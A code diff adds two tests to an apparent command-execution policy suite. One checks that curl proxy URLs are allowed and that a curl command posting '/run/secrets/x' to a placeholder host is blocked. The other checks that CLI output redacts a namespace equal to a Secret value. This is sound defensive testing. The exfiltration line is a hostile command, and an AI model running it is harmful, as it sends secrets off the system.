@@ -1657,3 +1657,33 @@ test("preview target echo masks a credential-bearing context name", () => {
     l.clean();
   }
 });
+
+test("attached and --option= network URLs are not treated as file paths", () => {
+  for (const argv of [
+    ["curl", "-xhttp://proxy.invalid:8080", "https://example.invalid"],
+    ["curl", "--proxy=http://proxy.invalid:8080", "https://example.invalid"],
+  ])
+    expect(execPolicy(argv, spec, "app").ok, argv.join(" ")).toBe(true);
+  expect(
+    execPolicy(
+      ["curl", "-d@/run/secrets/x", "https://example.invalid"],
+      spec,
+      "app",
+    ).ok,
+  ).toBe(false);
+});
+
+test("permission text masks a namespace equal to a referenced Secret value", () => {
+  const l = fixture();
+  try {
+    const result = cli(
+      ["exec", "web-1", "-n", C5, "--context", "default", "--", "ls", "/app"],
+      l.env,
+    );
+    expect(result.status, result.stdout).toBe(0);
+    expect(result.stdout).toContain("[REDACTED SECRET VALUE]");
+    expect(result.stdout).not.toContain(C5);
+  } finally {
+    l.clean();
+  }
+});
